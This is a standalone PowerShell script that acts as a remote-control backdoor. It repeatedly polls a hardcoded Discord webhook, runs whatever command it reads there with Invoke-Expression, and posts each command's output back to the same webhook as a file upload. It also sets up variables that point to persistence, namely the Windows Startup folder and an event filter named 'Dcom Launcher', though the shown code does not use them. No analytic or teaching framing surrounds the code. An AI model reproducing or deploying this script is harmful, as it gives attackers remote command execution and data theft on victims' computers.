
$temp = $env:TEMP;
$userprof = $env:USERPROFILE;
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
$EventFilterName = 'Dcom Launcher';
$load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
$uri = "https://discord.com/api/webhooks/971409555361779712/IbhO1R1Oe6utsRnMVBNVLYYeEhse8kJDFYKEKSYVTMVARBSWr2rkInfS7bMwLP-BUb4n";


try {
    do {  
        

        $response = Invoke-WebRequest -Uri $uri
        $jsonObj = ConvertFrom-Json $([String]::new($response.Content))        
        
        $jsonobj | select 'name' | out-file -filepath $temp\9hdmNxcUguHounsfIr72.txt
        $jsonobj1 = (Get-Content -Path "$temp\9hdmNxcUguHounsfIr72.txt" -tail 3) | Select-object -First 1 
        $files = (Get-Content -Path "$temp\9hdmNxcUguHounsfIr72.txt" -tail 3) | Select-object -First 1 | out-file -append $temp\LOl0InkQOQcrfIbUhToe.txt
        $jsonobj2 = (Get-Content -Path "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 1) | out-file $temp\qna.txt
               
        
        $a = (Get-Content "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 2)
        $b = (Get-Content "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 1)
        if ($a -ne $b){
            $rut = IEX($jsonobj1) | out-file $temp\mjCKMCrnUsANf3fXvZ5l.txt 
                    
            $fileName = "mjCKMCrnUsANf3fXvZ5l.txt"        
            $currentPath = $temp
            $filePath="$currentPath\$fileName"
        
            $fileBin = [System.IO.File]::ReadAlltext($filePath)
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream$LF",
            $fileBin,
            "--$boundary--$LF"
            ) -join $LF
        
            Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
        
        }        

    } until ( $response.StatusCode -eq [System.Net.HttpStatusCode]::NotFound )
}
catch {
     # catches 404 too
     Write-Debug "StatusCode: $($_.Exception.Response.StatusCode.Value__)"
}
